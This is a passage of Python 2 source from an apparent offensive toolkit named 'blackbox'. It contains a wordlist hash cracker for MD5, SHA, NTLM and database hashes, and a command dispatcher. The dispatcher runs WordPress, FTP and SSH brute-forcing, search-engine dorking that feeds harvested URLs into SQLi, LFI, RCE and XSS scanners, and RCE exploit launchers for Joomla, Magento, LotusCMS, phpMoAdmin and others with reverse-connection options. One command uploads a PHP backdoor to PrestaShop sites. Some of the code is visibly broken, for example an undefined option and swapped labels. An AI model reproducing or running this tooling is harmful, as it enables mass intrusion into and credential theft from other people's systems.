		stop = timeit.default_timer()
		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
	def sha224(self, sha224, wordlist):
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SHA224 HASH PATH : "+wordlist+color.ENDC)
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH    : "+sha224+color.ENDC)
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		word = wordlist.readlines()
		sha224 = open(sha224, "r")
		sha224 = sha224.readlines()
		var=0
		for i in word:
			i=i.strip()
			for o in sha224:
				o=o.strip()
				wordlistsha1 = hashlib.sha224(o).hexdigest()
				if i==wordlistsha1:
					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
					var+=1
		if var==0:
			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
		else:
			pass
		stop = timeit.default_timer()
		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
	def sha256(self, sha256, wordlist):
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SHA256 HASH PATH : "+wordlist+color.ENDC)
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH    : "+sha256+color.ENDC)
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		word = wordlist.readlines()
		sha256 = open(sha256, "r")
		sha256 = sha256.readlines()
		var=0
		for i in word:
			i=i.strip()
			for o in sha256:
				o=o.strip()
				wordlistsha1 = hashlib.sha256(o).hexdigest()
				if i==wordlistsha1:
					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
					var+=1
		if var==0:
			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
		else:
			pass		
		stop = timeit.default_timer()
		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
	def sha384(self, sha384, wordlist):
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SHA384 HASH PATH : "+wordlist+color.ENDC)
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH    : "+sha384+color.ENDC)
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		word = wordlist.readlines()
		sha384 = open(sha384, "r")
		sha384 = sha384.readlines()
		var=0
		for i in word:
			i=i.strip()
			for o in sha384:
				o=o.strip()
				wordlistsha1 = hashlib.sha384(o).hexdigest()
				if i==wordlistsha1:
					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
					var+=1
		if var==0:
			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
		else:
			pass		
		stop = timeit.default_timer()
		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
	def sha512(self, sha512, wordlist):
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SHA512 HASH PATH : "+wordlist+color.ENDC)
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH    : "+sha512+color.ENDC)
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		word = wordlist.readlines()
		sha512 = open(sha512, "r")
		sha512 = sha512.readlines()
		var=0
		for i in word:
			i=i.strip()
			for o in sha512:
				o=o.strip()
				wordlistsha1 = hashlib.sha512(o).hexdigest()
				if i==wordlistsha1:
					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
					var+=1
		if var==0:
			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
		else:
			pass		
		stop = timeit.default_timer()
		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
	def ntlm(self,wordlist, ha):
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" NTLM HASH PATH : "+ha+color.ENDC)
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH  : "+wordlist+color.ENDC)
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		wordlist = wordlist.readlines()
		ha = open(ha, "r")
		ha = ha.readlines()
		var=0
		for word in wordlist:
			word=word.strip()
			h = nthash.encrypt(word)
			for has in ha:
				if has == h:
					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
					var+=1
		if var==0:
			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
		else:
			pass		
		stop = timeit.default_timer()
		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
	def mssql2000(self,wordlist, ha):
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" MSSQL2000 HASH PATH : "+ha+color.ENDC)
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH  : "+wordlist+color.ENDC)
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		wordlist = wordlist.readlines()
		ha = open(ha, "r")
		ha = ha.readlines()
		var=0
		for word in wordlist:
			word=word.strip()
			for has in ha:
				has = has.strip()
				h = m20.verify(has,word)
				if h ==True:
					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
					var+=1
		if var==0:
			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
		else:
			pass		
		stop = timeit.default_timer()
		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
	def mssql2005(self,wordlist, ha):
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" MSSQL2005 HASH PATH : "+ha+color.ENDC)
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		wordlist = wordlist.readlines()
		ha = open(ha, "r")
		ha = ha.readlines()
		var=0
		for word in wordlist:
			word=word.strip()
			for has in ha:
				has = has.strip()
				h = m25.verify(has,word)
				if h ==True:
					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
					var+=1
		if var==0:
			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
		else:
			pass
		stop = timeit.default_timer()
		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
#mysql323
	def mysql323(self,wordlist, ha):
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" MYSQL323 HASH PATH  : "+ha+color.ENDC)
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		wordlist = wordlist.readlines()
		ha = open(ha, "r")
		ha = ha.readlines()
		var=0
		for word in wordlist:
			word=word.strip()
			for has in ha:
				has = has.strip()
				h = mysql323.verify(has,word)
				if h ==True:
					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
					var+=1
		if var==0:
			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
		else:
			pass
		stop = timeit.default_timer()
		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
#mysql41
	def mysql41(self,wordlist, ha):
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" MYSQL41 HASH PATH   : "+ha+color.ENDC)
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		wordlist = wordlist.readlines()
		ha = open(ha, "r")
		ha = ha.readlines()
		var=0
		for word in wordlist:
			word=word.strip()
			for has in ha:
				has = has.strip()
				h = mysql41.verify(has,word)
				if h ==True:
					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
					var+=1
		if var==0:
			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
		else:
			pass
		stop = timeit.default_timer()
		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
	def oracle11(self,wordlist, ha):
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" ORACLE HASH PATH    : "+ha+color.ENDC)
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		wordlist = wordlist.readlines()
		ha = open(ha, "r")
		ha = ha.readlines()
		var=0
		for word in wordlist:
			word=word.strip()
			for has in ha:
				has = has.strip()
				h = oracle11.verify(has,word)
				if h ==True:
					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
					var+=1
		if var==0:
			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
		else:
			pass
		stop = timeit.default_timer()
		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)

####################################
##                                ##
##             MAIN               ##
##                                ##
####################################
def __main__():
	print "\033c"
	__banner__()
	for arg in sys.argv:
		if (arg=="--help" or arg=="-h"):
			__help__()
		if (arg=="wordpress_brute"):
			wp_hp = color.W+color.BOLD+sys.argv[0]+" wordpress_brute --url [URL OF TARGET] -u/--username [USERNAME OF ADMIN] -w/--wordlist [PASSWORD WORDLIST]\nExample: "+sys.argv[0]+" wordpress_brute xxxxxxxx.com -w /root/rockyou.txt"+color.ENDC
			parser = OptionParser(usage=wp_hp)
			parser.add_option("--url",help="URL OF TARGET")
			parser.add_option("--username","-u",help="Username of Wordpress")
			parser.add_option("--wordlist","-w",help="Wordlist for attack target")
			(options,args) = parser.parse_args()
			url = options.url
			username = options.username
			wordlist = options.wordlist
			if url and username and wordlist:
				BruteForce().wordpress(url, username, wordlist)
				break


		if (arg == "dns_info"):
			di_hp = color.W+color.BOLD+sys.argv[0]+" dns_info --ip [IP] --yougetsignal/--viewdns/--hackertarget [SELECT JUST ONE SERVICE!] \nExample: "+sys.argv[0]+" dns_info --ip google.com --yougetsignal"+color.ENDC
			parser = OptionParser(usage=di_hp)
			parser.add_option("--ip",
				help="Parse IP address")
			parser.add_option("--yougetsignal","-y",
				help="Get website from yougetsignal",action="store_true")
			parser.add_option("--viewdns","-v",
				help="Get website from viewdns",action="store_true")
			parser.add_option("--hackertarget","-t",
				help="Get website from hackertarget",action="store_true")
			(options,args) = parser.parse_args()
			ip = options.ip
			yougetsignal = options.yougetsignal
			viewdns = options.viewdns
			hackertarget = options.hackertarget
			if ip and yougetsignal==True:
				dnsinfo().yougetsignal(ip)
			if ip and viewdns==True:
				dnsinfo().viewdns(ip)
			if ip and hackertarget==True:
				dnsinfo().hackertarget(ip)
		if (arg=="rce_joomla"):
			rj_hp = color.W+color.BOLD+sys.argv[0]+" rce_joomla -w/--wordlist [SELECT PATH OF URLs SAVED IN WORDLIST]\nExample: "+sys.argv[0]+" rce_joomla -w joomla3.txt"+color.ENDC
			parser = OptionParser(usage=rj_hp)
			parser.add_option("--wordlist","-w",
				help="wordlist path")
			(options,args) = parser.parse_args()
			wordlist = options.wordlist
			if wordlist:
				exploit().joomla(wordlist)
		if (arg=="rce_magento"):
			rm_hp = color.W+color.BOLD+sys.argv[0]+" rce_magento -w/--wordlist [SELECT PATH OF URLs SAVED IN WORDLIST]\nExample: "+sys.argv[0]+" rce_magento -w magento.txt"+color.ENDC
			parser = OptionParser(usage=rm_hp)
			parser.add_option("--wordlist","-w",
				help="Wordlist path")
			(options,args) = parser.parse_args()
			wordlist = options.wordlist
			if wordlist:
				exploit().magento(wordlist)
		if (arg=="rce_pmo"):
			pmo="blackbox rce_pmo --wordlist/-w ~/Desktop/pmo.txt --lhost 192.168.1.5 --lport 80"
			parser = OptionParser(usage=pmo)
			parser.add_option("--wordlist","-w",
				help="path of target link")
			parser.add_option("--lhost",
				help="local HOST")
			parser.add_option("--lport",
				help="local PORT")
			(options,args) = parser.parse_args()
			wordlist = options.wordlist
			lhost = options.lhost
			lport = options.lport
			if wordlist and lhost and lport:
				for i in wordlist:
					i=i.strip()
					exploit().phpmoadmin(i, lhost, lport)
		if (arg=="rce_elastic"):
			els="blackbox rce_elastic --wordlist/-w ~/Desktop/elastic.txt"
			parser = OptionParser(usage=els)
			parser.add_option("--wordlist","-w",
				help="path of target link")
			(options,args) = parser.parse_args()
			target = options.target
			if wordlist and lhost and lport:
				for i in wordlist:
					i=i.strip()
					exploit().elastic(target)
		if (arg=="rce_lotus"):
			lts="blackbox rce_lotus --wordlist/-w  ~/Desktop/lotuscms.txt --lhost 192.168.1.5 --lport 80"
			parser = OptionParser(usage=lts)
			parser.add_option("--wordlist","-w",
				help="path of target link")
			parser.add_option("--lhost",
				help="local HOST")
			parser.add_option("--lport",
				help="local PORT")
			(options,args) = parser.parse_args()
			wordlist = options.wordlist
			lhost = options.lhost
			lport = options.lport
			if wordlist and lhost and lport:
				for i in wordlist:
					i=i.strip()
					exploit().lotuscms(i, lhost, lport)
		if (arg=="wp_nmedia"):
			lts="blackbox wp_nmedia --wordlist/-w ~/Desktop/wpfile.txt --lhost 192.168.1.5 --lport 80"
			parser = OptionParser(usage=lts)
			parser.add_option("--wordlist","-w",
				help="path of target link")
			parser.add_option("--lhost",
				help="local HOST")
			parser.add_option("--lport",
				help="local PORT")
			(options,args) = parser.parse_args()
			wordlist = options.wordlist
			lhost = options.lhost
			lport = options.lport
			if wordlist and lhost and lport:
				for i in wordlist:
					i=i.strip()
					exploit().wp_nmedia(i, lhost, lport)
		if (arg=="wp_shop"):
			lts="blackbox wp_shop --wordlist/-w ~/Desktop/wpfile.txt --lhost 192.168.1.5 --lport 80"
			parser = OptionParser(usage=lts)
			parser.add_option("--wordlist","-w",
				help="path of target link")
			parser.add_option("--lhost",
				help="local HOST")
			parser.add_option("--lport",
				help="local PORT")
			(options,args) = parser.parse_args()
			wordlist = options.wordlist
			lhost = options.lhost
			lport = options.lport
			if wordlist and lhost and lport:
				for i in wordlist:
					i=i.strip()
					exploit().wp_shop(i, lhost, lport)
		if (arg=="google_dorker"):
			gd_hp = color.W+color.BOLD+sys.argv[0]+' google_dorker -d/--dork="[DORK]" --level [NUMBER OF PAGE] --[LFI/RCE/XSS/SQLi!]\nExample: '+sys.argv[0]+' google_dorker --dork="php?id=" --level 10 '+color.ENDC
			
			parser = OptionParser(usage=gd_hp)
			parser.add_option("--dork","-d",
				help="Dork for get URL")
			parser.add_option("--lists","-l",
				help="Dork for get URL")
			parser.add_option("--level",type=int,default=10,
				help="Number of page to stop")
			parser.add_option("--lfi",
			help="Scan Founded website from LFI", action="store_true")
			parser.add_option("--sqli",
			help="Scan Founded website from SQLi", action="store_true")
			parser.add_option("--rce",
			help="Scan Founded website from RCE", action="store_true")
			parser.add_option("--xss",
			help="Scan Founded website from XSS", action="store_true")
			(options,args) = parser.parse_args()
			dork = options.dork
			lists=options.lists
			level = options.level
			lfi = options.lfi
			sqli = options.sqli
			rce = options.rce
			xss = options.xss
			if lists and level is not None:
				lists = open(lists, "r");lists=lists.readlines()
				for dorks in lists:
					dorks=dorks.strip()
					dorker().google(dorks, 0, level)
			if lists and level is not None and sqli==True:
				print (color.R+color.BOLD+"SQLi Scanner : "+color.ENDC)
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					scanner().sqli(urll)
			if lists and level is not None and lfi==True:
				print (color.R+color.BOLD+"LFI Scanner : "+color.ENDC)
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					scanner().lfi(urll)
			if lists and level is not None and rce==True:
				print (color.R+color.BOLD+"RCE Scanner : "+color.ENDC)
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					scanner().rce(urll)
			if lists and level is not None and xss==True:
				print (color.R+color.BOLD+"XSS Scanner : "+color.ENDC)
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					scanner().xss(urll)

			if dork and level is not None:
				dorker().google(dork, 0, level)
			if dork and level is not None and lfi==True:
				print (color.R+color.BOLD+"LFI Scanner : "+color.ENDC)
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					scanner().lfi(urll)
			if dork and level is not None and sqli==True:
				print (color.R+color.BOLD+"SQLi Scanner : "+color.ENDC)
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					scanner().sqli(urll)
			if dork and level is not None and rce==True:
				print (color.R+color.BOLD+"RCE Scanner : "+color.ENDC)
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					scanner().rce(urll)
			if dork and level is not None and xss==True:
				print (color.R+color.BOLD+"XSS Scanner : "+color.ENDC)
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					scanner().xss(urll)

		if (arg=="bing_dorker"):
			gd_hp = color.W+color.BOLD+sys.argv[0]+' bing_dorker --ip [IP OF TARGET] -d/--dork="[DORK]" --lfi [IF YOU WANT TO SCAN WEBSITE FROM LFI!]\nExample: '+sys.argv[0]+' bing_dorker --ip 192.xx.xxx.xxx --dork="php?id="'+color.ENDC
			parser = OptionParser(usage=gd_hp)
			parser.add_option("--ip")
			parser.add_option("--dork","-d",
				help="Dork for get URL")
			parser.add_option("--lists","-l",
				help="Dork for get URL")
			parser.add_option("--lfi",
			help="Scan Founded website from LFI", action="store_true")
			parser.add_option("--sqli",
			help="Scan Founded website from SQLi", action="store_true")
			parser.add_option("--rce",
			help="Scan Founded website from RCE", action="store_true")
			parser.add_option("--xss",
			help="Scan Founded website from XSS", action="store_true")
			(options,args) = parser.parse_args()
			ip = options.ip
			dork = options.dork;lists=options.lists
			lfi = options.lfi
			sqli = options.sqli
			rce = options.rce
			xss = options.xss
			if ip and dork:
				dorker().bing_ip(ip,dork)
			if ip and dork and lfi==True:
				print (color.R+color.BOLD+"LFI Scanner : "+color.ENDC)
				burl= dorker().burl
				for urll in burl:
					urll= urll.strip()
					scanner().lfi(urll)
			if ip and dork and sqli==True:
				print (color.R+color.BOLD+"SQLi Scanner : "+color.ENDC)
				burl= dorker().burl
				for urll in burl:
					urll= urll.strip()
					scanner().sqli(urll)
			if ip and dork and rce==True:
				print (color.R+color.BOLD+"RCE Scanner : "+color.ENDC)
				burl= dorker().burl
				for urll in burl:
					urll= urll.strip()
					scanner().rce(urll)
			if ip and dork and xss==True:
				print (color.R+color.BOLD+"XSS Scanner : "+color.ENDC)
				burl= dorker().burl
				for urll in burl:
					urll= urll.strip()
					scanner().xss(urll)

			if lists:
				lists = open(lists, "r");lists=lists.readlines()
				for dorks in lists:
					dorks=dorks.strip()
					dorker().bing(ip, dorks)
			if ip and lists and sqli==True:
				print (color.R+color.BOLD+"SQLi Scanner : "+color.ENDC)
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					scanner().sqli(urll)
			if ip and lists and lfi==True:
				print (color.R+color.BOLD+"LFI Scanner : "+color.ENDC)
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					scanner().lfi(urll)
			if ip and lists and rce==True:
				print (color.R+color.BOLD+"RCE Scanner : "+color.ENDC)
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					scanner().rce(urll)
			if ip and lists and xss==True:
				print (color.R+color.BOLD+"XSS Scanner : "+color.ENDC)
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					scanner().xss(urll)
		if (arg=="hash_killer"):
			hk_hp = color.W+color.BOLD+sys.argv[0]+' hash_killer -w/--wordlist [PATH OF WORDLIST] --md5 or --sha1 etc... [PATH OF HASHs]\nExample: '+sys.argv[0]+' -w /root/rockyou.txt --md5 hash.txt'+color.ENDC
			parser = OptionParser(usage=hk_hp)
			parser.add_option("-w","--wordlist",help="Path Of Wordlist !")
			parser.add_option("--md5", help="Path of MD5 hash")
			parser.add_option("--sha1", help="Path of SHA1 hash")
			parser.add_option("--sha224", help="Path of SHA224 hash")
			parser.add_option("--sha256", help="Path of SHA256 hash")
			parser.add_option("--sha384", help="Path of SHA384 hash")
			parser.add_option("--sha512", help="Path of SHA512 hash")
			parser.add_option("--ntlm", help="Path of NTLM hash")
			parser.add_option("--mssql2000", help="Path of MSSQL2000 hash")
			parser.add_option("--mssql2005", help="Path of MSSQL2005 hash")
			parser.add_option("--mysql323", help="Path of MYSQL323 hash")
			parser.add_option("--mysql41", help="Path of MYSQL41 hash")
			parser.add_option("--oracle11", help="Path of ORACLE11 hash")
			(options,args) = parser.parse_args()
			wordlist       = options.wordlist
			md5            = options.md5
			sha1           = options.sha1
			sha224         = options.sha224
			sha256         = options.sha256
			sha384         = options.sha384
			sha512         = options.sha512
			ntlm           = options.ntlm
			mssql2000      = options.mssql2000
			mssql2005      = options.mssql2005
			mysql323       = options.mysql323
			mysql41        = options.mysql41
			oracle11       = options.oracle11
			crack = cracker()
			if md5 and wordlist:
				crack.md5(wordlist,md5)
			if sha1 and wordlist:
				crack.sha1(wordlist, sha1)
			if sha224 and wordlist:
				crack.sha224(wordlist, sha224)
			if sha256 and wordlist:
				crack.sha256(wordlist, sha256)
			if sha384 and wordlist:
				crack.sha384(wordlist, sha384)
			if sha512 and wordlist:
				crack.sha512(wordlist, sha512)
			if ntlm and wordlist:
				crack.ntlm(ntlm,wordlist)
			if mssql2000 and wordlist:
				crack.mssql2000(mssql2000,wordlist)
			if mssql2005 and wordlist:
				crack.mssql2005(mssql2005,wordlist)
			if mysql323 and wordlist:
				crack.mysql323(mysql323,wordlist)
			if mysql41 and wordlist:
				crack.mysql41(mysql41,wordlist)
			if oracle11 and wordlist:
				crack.oracle11(oracle11,wordlist)
		if (arg=="-u" or arg=="--update"):
			__update__()
		if (arg=="presta_exploit"):
			pe_hp = color.W+color.BOLD+sys.argv[0]+' presta_exploit -l/--lists [PATH OF WORDLIST] -s/--script [PATH OF .php BACKDOOR]\nExample: '+sys.argv[0]+' presta_exploit -l prestalinks.txt -s upload.php'+color.ENDC
			parser = OptionParser(usage=pe_hp)
			parser.add_option("--lists","-l",
				help="wordlist path")
			(options,args) = parser.parse_args()
			lists = options.lists
			if lists:
				script = "/opt/blackbox/payload/up.php"
				exploit().presta_run(lists,script)
		if (arg=="ftp_brute"):
			fb_hp = color.W+color.BOLD+sys.argv[0]+' ftp_brute --ip [IP ADDRESS] -u/--username [USERNAME OF FTP LOGIN] -w/--wordlist [PATH OF WORDLIST]\nExample: '+sys.argv[0]+' ftp_brute --ip 192.168.xxx.xx -u root -w password.txt'+color.ENDC
			parser = OptionParser(usage=fb_hp)
			parser.add_option("--ip",
				help="IP address Of FTP SERVER")
			parser.add_option("--username","-u",
				help="USERNAME OF FTP SERVER")
			parser.add_option("--wordlist","-w",
				help="WORDLIST PATH")
			(options,args) = parser.parse_args()
			ip     = options.ip
			username = options.username
			wordlist = options.wordlist
			if ip and username and wordlist:
				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" USERNAME : "+username+color.ENDC)
				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST : "+wordlist+color.ENDC)
				wordlist = open(wordlist,"r")
				wordlist = wordlist.readlines()
				for password in  wordlist:
					password=password.strip()
					BruteForce().ftp_brute(ip,username,password)

		if (arg=="ssh_brute"):
			sb_hp = color.W+color.BOLD+sys.argv[0]+' ssh_brute --ip [IP ADDRESS] -u/--username [USERNAME OF SSH LOGIN] -w/--wordlist [PATH OF WORDLIST]\nExample: '+sys.argv[0]+' ssh_brute --ip 192.168.xxx.xx -u root -w password.txt'+color.ENDC
			parser = OptionParser(usage=sb_hp)
			parser.add_option("--ip",
				help="IP address Of SSH SERVER")
			parser.add_option("--username","-u",
				help="USERNAME OF SSH SERVER")
			parser.add_option("--wordlist","-w",
				help="WORDLIST PATH")
			(options,args) = parser.parse_args()
			ip     = options.ip
			username = options.username
			wordlist = options.wordlist
			if ip and username and wordlist:
				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" USERNAME : "+username+color.ENDC)
				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST : "+wordlist+color.ENDC)
				wordlist = open(wordlist,"r")
				wordlist = wordlist.readlines()
				for password in  wordlist:
					password=password.strip()
					BruteForce().ssh_brute(ip,username,password)


		if (arg=="admin_brute"):
			ab_hp = color.W+color.BOLD+sys.argv[0]+' admin_brute -u/--url [URL] --php --asp --cfm etc... [WEB]\nExample: '+sys.argv[0]+' admin_brute http://google.com --php'+color.ENDC
			parser = OptionParser(usage=ab_hp)
			parser.add_option("--url","-u",
				help="URL FOR GET ADMIN PANEL")
			parser.add_option("--php",
				action="store_true")
			parser.add_option("--asp",
				action="store_true")
			parser.add_option("--cfm",
				action="store_true")
			parser.add_option("--js",
				action="store_true")
			parser.add_option("--cgi",
				action="store_true")
			parser.add_option("--brf",
				action="store_true")
			(options,args) = parser.parse_args()
			url = options.url
			php = options.php
			asp = options.asp
			cfm = options.cfm
			js  = options.js
			cgi = options.cgi
			brf = options.brf
			if url and php==True:
				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SOURCE             : PHP"+color.ENDC)
				admin_finder().php_admin(url)
			if url and asp==True:
				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SOURCE             : ASP"+color.ENDC)
				admin_finder().asp_admin(url)
			if url and cfm==True:
				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SOURCE             : CFM"+color.ENDC)
				admin_finder().cfm_admin(url)
			if url and js==True:
				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SOURCE             : JS"+color.ENDC)
				admin_finder().js_admin(url)
			if url and cgi==True:
				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SOURCE             : CGI"+color.ENDC)
				admin_finder().cgi_admin(url)
			if url and brf==True:
				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
				print (color.C+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SOURCE             : BRF"+color.ENDC)
				admin_finder().brf_admin(url)

		if (arg=="scan_list"):
			sl_hp = color.W+color.BOLD+sys.argv[0]+' scan_list -l/--list [PATH] --[LFI/SQLi/RCE/XSS]\nExample: '+sys.argv[0]+' scan_list -l/--lists /path/to/list --sqli'+color.ENDC
			parser = OptionParser(usage=sl_hp)
			parser.add_option("--lists","-l",
				help="LIST COUNTAIN URLs !")
			parser.add_option("--sqli",
			help="Scan Founded website from SQLi", action="store_true")
			parser.add_option("--xss",
			help="Scan Founded website from XSS", action="store_true")
			parser.add_option("--rce",
			help="Scan Founded website from RCE", action="store_true")
			parser.add_option("--lfi",
			help="Scan Founded website from LFI", action="store_true")
			(options,args) = parser.parse_args()
			lists = options.lists
			sqli = options.sqli
			xss = options.xss
			rce = options.rce
			lfi = options.lfi
			if lists and sqli==True:
				print (color.R+color.BOLD+"SQLi Scanner : "+color.ENDC)
				lists = open(lists, "r")
				lists = lists.readlines()
				for i in lists:
					i=i.strip()
					scanner().sqli(i)
			if lists and xss==True:
				print (color.R+color.BOLD+"XSS Scanner : "+color.ENDC)
				lists = open(lists, "r")
				lists = lists.readlines()
				for i in lists:
					i=i.strip()
					scanner().xss(i)
			if lists and rce==True:
				print (color.R+color.BOLD+"RCE Scanner : "+color.ENDC)
				lists = open(lists, "r")
				lists = lists.readlines()
				for i in lists:
					i=i.strip()
					scanner().rce(i)
			if lists and lfi==True:
				print (color.R+color.BOLD+"LFI Scanner : "+color.ENDC)
				lists = open(lists, "r")
				lists = lists.readlines()
				for i in lists:
					i=i.strip()
					scanner().lfi(i)
		if (len(sys.argv)<=1):
